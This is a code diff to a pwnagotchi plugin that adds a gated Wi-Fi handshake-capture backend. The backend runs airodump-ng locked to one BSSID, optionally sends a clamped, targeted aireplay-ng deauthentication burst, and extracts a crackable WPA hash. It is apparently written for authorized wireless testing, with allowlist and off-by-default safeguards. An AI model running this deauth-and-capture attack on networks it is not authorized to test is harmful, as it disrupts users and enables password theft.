@@ -64,6 +64,10 @@ ELEMENT_NAME = "netmgr"
 
 KINDS = ("wifi_join", "fleet", "wifi_target")
 
+# The wifi_target capture backend caps deauth frames hard: this is a
+# handshake-capture nudge, never an open-ended jam. Values above are clamped.
+MAX_DEAUTH = 64
+
 DEFAULTS = {
     "enabled": False,
     # No working default - a blank/placeholder/<12-char token refuses to start.
@@ -85,6 +89,19 @@ DEFAULTS = {
     # additive - it never deletes or overwrites what's already there.
     "handshakes_dir": "/etc/pwnagotchi/handshakes",                       # -> wifi_target rows
     "fleet_json_path": "/home/pi/.config/fleetctl/fleet.json",     # -> fleet rows
+    # --- wifi_target capture backend (the authorized-path "real test") ---
+    # OFF by default. Even for an authorized target, NOTHING runs unless BOTH
+    # capture_backend_enabled is true AND capture_iface names a SECOND adapter
+    # (never the pwnagotchi radio). It runs standard tools (airodump-ng capture
+    # locked to the one authorized BSSID, + an optional bounded, targeted
+    # aireplay-ng deauth) and drops the handshake into handshakes_dir.
+    "capture_backend_enabled": False,   # master switch (2nd gate on top of the allowlist)
+    "capture_iface": "",                # e.g. "wlan1" - run netmanager_wifi_probe.sh to find it
+    "capture_seconds": 25,              # how long airodump captures
+    "deauth_count": 0,                  # 0 = PASSIVE capture only (no frames sent). >0 = bounded deauth
+    "capture_out_dir": "",              # where the .pcapng lands (empty -> handshakes_dir)
+    # interfaces the backend refuses to use (the pwnagotchi/bettercap radio):
+    "builtin_ifaces": ["wlan0", "wlan0mon", "mon0"],
     "ui_enabled": True,
     "ui_position_x": -40,
     "ui_position_y": 30,
@@ -504,6 +521,151 @@ def fire_wifi_target(entry, allowlist):
                        "the gate; it does not send frames itself." % who}
 
 
+def _safe_name(s):
+    """pwnagotchi-ish filename component: keep it tame for the filesystem."""
+    s = re.sub(r"[^A-Za-z0-9_.-]", "", str(s or "").strip())
+    return s[:48]
+
+
+def plan_capture(entry, cfg):
+    """PURE: decide whether/how the wifi_target capture backend runs, and build
+    the exact commands. Returns (plan, reason). plan is None when it won't run,
+    with a human reason - and a None plan NEVER sends anything.
+
+    Safety properties enforced here (all unit-tested):
+      * backend must be explicitly enabled (2nd switch on top of the allowlist),
+      * capture_iface must be set AND must NOT be the pwnagotchi/bettercap radio,
+      * a BSSID is required (capture is LOCKED to that one BSSID; no broad sweep),
+      * deauth is OFF unless deauth_count>0, is TARGETED at that BSSID, and is
+        hard-clamped to MAX_DEAUTH (a capture nudge, never a flood)."""
+    cfg = cfg or {}
+    if not cfg.get("capture_backend_enabled"):
+        return None, "capture backend is off (capture_backend_enabled=false) - gate passed, nothing run"
+    iface = str(cfg.get("capture_iface") or "").strip()
+    if not iface:
+        return None, "no capture_iface set - run netmanager_wifi_probe.sh to pick a 2nd adapter"
+    builtin = {str(x).strip().lower() for x in (cfg.get("builtin_ifaces") or [])}
+    if iface.lower() in builtin:
+        return None, ("capture_iface '%s' is the pwnagotchi radio - use a SECOND USB "
+                      "adapter, never the engine's interface" % iface)
+    fields = (entry or {}).get("fields") or {}
+    bssid = (fields.get("bssid") or "").strip()
+    ssid = (fields.get("ssid") or (entry or {}).get("name") or "").strip()
+    if not bssid:
+        return None, "this target has no BSSID - the capture is locked to a BSSID, so add one first"
+    bssid12 = _norm_mac(bssid)
+    if not re.fullmatch(r"[0-9a-f]{12}", bssid12):
+        return None, "BSSID '%s' is not a valid MAC" % bssid
+    channel = str(fields.get("channel") or "").strip()
+    try:
+        seconds = max(5, int(cfg.get("capture_seconds") or 25))
+    except (TypeError, ValueError):
+        seconds = 25
+    try:
+        deauth = int(cfg.get("deauth_count") or 0)
+    except (TypeError, ValueError):
+        deauth = 0
+    deauth = max(0, min(deauth, MAX_DEAUTH))  # clamp: capture nudge, not a jam
+    out_dir = str(cfg.get("capture_out_dir") or cfg.get("handshakes_dir") or ".").strip()
+    out_base = (_safe_name(ssid) + "_" + bssid12) if ssid else bssid12
+    out_path = os.path.join(out_dir, out_base)
+
+    bssid_fmt = _fmt_bssid(bssid12)
+    capture = ["airodump-ng", "--bssid", bssid_fmt, "-w", out_path,
+               "--output-format", "pcapng"]
+    if channel:
+        capture += ["-c", channel]
+    capture += [iface]
+    cmds = {
+        "channel": (["iw", "dev", iface, "set", "channel", channel] if channel else None),
+        "capture": capture,
+        # targeted at the one AP (-a BSSID); NO broadcast-to-all deauth, and only if asked
+        "deauth": (["aireplay-ng", "--deauth", str(deauth), "-a", bssid_fmt, iface]
+                   if deauth > 0 else None),
+    }
+    plan = {"iface": iface, "bssid": bssid_fmt, "ssid": ssid, "channel": channel or None,
+            "seconds": seconds, "deauth_count": deauth, "out_dir": out_dir,
+            "out_basename": out_base, "out_path": out_path, "cmds": cmds}
+    return plan, "ok"
+
+
+def run_capture_backend(entry, cfg, execute=None):
+    """Run the authorized-path capture for a wifi_target. `execute(plan)` does the
+    real hardware work (airodump + optional bounded deauth) and returns a dict
+    like {captured: bool, handshake: bool, file: str, detail: str}; it is
+    injectable so the gating + command build are testable without a radio.
+
+    When the backend isn't enabled/ready, returns the gate-only authorized result
+    (never an error, never sends anything)."""
+    plan, reason = plan_capture(entry, cfg)
+    who = plan["bssid"] if plan else ((entry or {}).get("fields", {}).get("bssid")
+                                      or (entry or {}).get("name") or "?")
+    if plan is None:
+        return {"ok": True, "kind": "wifi_target", "authorized": True, "ran": False,
+                "message": "authorized ✓ ('%s') - %s" % (who, reason)}
+    if execute is None:  # pragma: no cover - real hardware path
+        execute = _execute_capture
+    try:
+        res = execute(plan) or {}
+    except Exception as exc:  # never let the backend crash the fire handler
+        return {"ok": False, "kind": "wifi_target", "authorized": True, "ran": True,
+                "message": "capture backend errored on '%s': %s" % (who, str(exc)[:160])}
+    captured = bool(res.get("captured"))
+    hs = bool(res.get("handshake"))
+    nudge = (" (deauth x%d)" % plan["deauth_count"]) if plan["deauth_count"] else " (passive)"
+    if hs:
+        msg = "✓ handshake captured from '%s'%s -> %s" % (who, nudge, res.get("file") or plan["out_path"])
+    elif captured:
+        msg = "ran on '%s'%s - capture written, no handshake yet -> %s" % (who, nudge, res.get("file") or plan["out_path"])
+    else:
+        msg = "ran on '%s'%s - no capture (%s)" % (who, nudge, res.get("detail") or "nothing seen")
+    return {"ok": True, "kind": "wifi_target", "authorized": True, "ran": True,
+            "captured": captured, "handshake": hs, "file": res.get("file"),
+            "message": msg}
+
+
+def _execute_capture(plan):  # pragma: no cover - real hardware (needs a 2nd monitor adapter)
+    """Standard-tooling capture: lock airodump-ng to the one BSSID, optionally a
+    bounded targeted aireplay-ng deauth, then check the capture for a handshake.
+    Runs only after plan_capture authorized it. Needs airodump-ng/aireplay-ng
+    (aircrack-ng) and the 2nd adapter already in monitor mode."""
+    import glob
+    import shutil
+    import subprocess as sp
+    cmds = plan["cmds"]
+    os.makedirs(plan["out_dir"], exist_ok=True)
+    if cmds.get("channel"):
+        sp.run(cmds["channel"], capture_output=True, timeout=15)
+    # airodump in the background for the capture window
+    cap = sp.Popen(cmds["capture"], stdout=sp.DEVNULL, stderr=sp.DEVNULL)
+    try:
+        if cmds.get("deauth"):
+            sp.run(cmds["deauth"], capture_output=True, timeout=min(plan["seconds"], 30))
+        time.sleep(plan["seconds"])
+    finally:
+        cap.terminate()
+        try:
+            cap.wait(timeout=5)
+        except Exception:
+            cap.kill()
+    # airodump appends -01.cap/.pcapng; find the newest for this basename
+    hits = sorted(glob.glob(plan["out_path"] + "*.pcapng") + glob.glob(plan["out_path"] + "*.cap"),
+                  key=lambda p: os.path.getmtime(p) if os.path.exists(p) else 0)
+    capfile = hits[-1] if hits else None
+    handshake = False
+    if capfile:
+        # best-effort: hcxpcapngtool emits a non-empty .22000 iff there's a usable hash
+        if shutil.which("hcxpcapngtool"):
+            out22000 = capfile.rsplit(".", 1)[0] + ".22000"
+            sp.run(["hcxpcapngtool", "-o", out22000, capfile], capture_output=True, timeout=30)
+            handshake = os.path.exists(out22000) and os.path.getsize(out22000) > 0
+        elif shutil.which("aircrack-ng"):
+            r = sp.run(["aircrack-ng", capfile], capture_output=True, text=True, timeout=30)
+            handshake = "1 handshake" in (r.stdout or "") or "WPA (" in (r.stdout or "")
+    return {"captured": bool(capfile), "handshake": handshake, "file": capfile,
+            "detail": "no cap file produced" if not capfile else ""}
+
+
 def _http_post_json(url, token, payload, timeout):  # pragma: no cover - real network
     """POST json with a Bearer token. Returns (status|None, text). None status
     means the request never completed (network error) - text carries why."""
@@ -557,18 +719,27 @@ def fire_fleet(entry, post_fn=None, timeout=10, probe_task="uptime"):
             "message": "reachable & authed (probe '%s' note: %s)" % (probe_task, note)}
 
 
-def fire_dispatch(entry, post_fn=None, timeout=10, current_ssid=None, allowlist=None):
+def fire_dispatch(entry, post_fn=None, timeout=10, current_ssid=None, allowlist=None,
+                  capture_cfg=None, capture_execute=None):
     """Route FIRE by kind:
       fleet       -> safe reachability+auth probe
       wifi_join   -> safe read-only association check
-      wifi_target -> the authorized-target allowlist GATE (no frames sent here)"""
+      wifi_target -> the authorized-target allowlist GATE. If (and only if) the
+                     target passes the gate AND the capture backend is enabled +
+                     configured, run the authorized capture; otherwise return the
+                     gate-only authorized result (no frames)."""
     kind = (entry or {}).get("kind")
     if kind == "fleet":
         return fire_fleet(entry, post_fn=post_fn, timeout=timeout)
     if kind == "wifi_join":
         return fire_wifi_join(entry, current_ssid=current_ssid)
     if kind == "wifi_target":
-        return fire_wifi_target(entry, allowlist=allowlist)
+        gate = fire_wifi_target(entry, allowlist=allowlist)
+        if not gate.get("authorized"):
+            return gate  # REFUSED - the allowlist gate said no
+        if capture_cfg and capture_cfg.get("capture_backend_enabled"):
+            return run_capture_backend(entry, capture_cfg, execute=capture_execute)
+        return gate  # authorized, backend off -> gate-only result
     return fire_stub(entry)
 
 
@@ -578,7 +749,7 @@ def fire_dispatch(entry, post_fn=None, timeout=10, current_ssid=None, allowlist=
 
 class NetManagerNG(plugins.Plugin):
     __author__ = "built for this project's network-manager track"
-    __version__ = "0.3.1"
+    __version__ = "0.4.0"
     __license__ = "GPL3"
     __description__ = ("Phone-friendly Network Manager: a searchable, 50+-scale "
                        "list of your networks/targets with add/edit/delete, a "
@@ -841,11 +1012,21 @@ class NetManagerNG(plugins.Plugin):
             return jsonify({"ok": False, "error": "no such network"}), 400
         logging.warning("[netmanager_ng] FIRE requested on %s (%s)",
                         entry.get("name"), entry.get("kind"))
+        capture_cfg = {
+            "capture_backend_enabled": self._opt_bool("capture_backend_enabled", False),
+            "capture_iface": self._opt("capture_iface"),
+            "capture_seconds": self._opt_int("capture_seconds", 25),
+            "deauth_count": self._opt_int("deauth_count", 0),
+            "capture_out_dir": self._opt("capture_out_dir"),
+            "handshakes_dir": resolve_handshakes_dir(self._opt("handshakes_dir")),
+            "builtin_ifaces": self._opt("builtin_ifaces") or DEFAULTS["builtin_ifaces"],
+        }
         result = fire_dispatch(
             entry,
             timeout=self._opt_int("fire_timeout_seconds", 10),
             current_ssid=self.current_ssid(),
-            allowlist=self._opt("authorized_targets") or [])
+            allowlist=self._opt("authorized_targets") or [],
+            capture_cfg=capture_cfg)
         logging.warning("[netmanager_ng] FIRE %s result: ok=%s %s",
                         entry.get("name"), result.get("ok"), result.get("message"))
         return jsonify(result), 200
